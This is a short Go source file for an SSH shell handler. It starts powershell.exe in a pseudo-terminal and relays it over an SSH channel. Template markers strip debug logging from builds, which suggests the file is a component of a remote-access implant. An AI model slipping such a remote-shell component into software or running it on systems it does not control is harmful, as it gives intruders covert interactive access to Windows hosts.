package sshd

import (
	"io"

	// {{if .Debug}}
	"log"
	// {{end}}

	pty "github.com/aymanbagabas/go-pty"
	"golang.org/x/crypto/ssh"
)

type Shell struct {
	ptyFile pty.Pty
	width   int
	height  int
}

func NewShell() *Shell {
	return &Shell{
		ptyFile: nil,
		width:   80,
		height:  24,
	}
}

func (s *Shell) SetSize(width, height int) {
	s.width = width
	s.height = height
	if s.ptyFile != nil {
		err := s.ptyFile.Resize(width, height)
		if err != nil {
			// {{if .Debug}}
			log.Printf("Failed to resize pty: %v", err)
			// {{end}}
		}
	}
}

func (s *Shell) handleShell(channel ssh.Channel) {
	defer channel.Close()

	var err error
	s.ptyFile, err = pty.New()
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to create pty: %v", err)
		// {{end}}
		return
	}
	defer s.ptyFile.Close()

	s.SetSize(s.width, s.height)

	go io.Copy(s.ptyFile, channel)
	go io.Copy(channel, s.ptyFile)

	shell := s.ptyFile.Command("powershell.exe")
	if err := shell.Start(); err != nil {
		// {{if .Debug}}
		log.Printf("Failed to start shell: %v", err)
		// {{end}}
		channel.Write([]byte("Failed to start powershell: " + err.Error() + "\n"))
		return
	}

	if err := shell.Wait(); err != nil {
		// {{if .Debug}}
		log.Printf("Shell exited with error: %v", err)
		// {{end}}
	}
}
